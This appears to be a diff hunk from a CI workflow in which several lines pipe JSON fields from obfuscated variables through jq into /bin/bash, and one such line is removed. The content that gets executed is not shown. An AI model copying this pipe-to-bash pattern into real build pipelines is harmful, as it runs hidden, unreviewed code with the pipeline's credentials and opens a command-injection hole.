@@ -24,7 +24,6 @@ jobs:
           echo $j7820 | jq -r .lffk2898 | /bin/bash
           echo $ppb149 | jq -r .m33 | /bin/bash
           echo $hc65 | jq -r .c70 | /bin/bash
-          echo $i3 | jq -r .dgo4534 | /bin/bash
           printf '%s' "$ichap42534" | jq -r .qns47 | /bin/bash
 
       - name: Store output
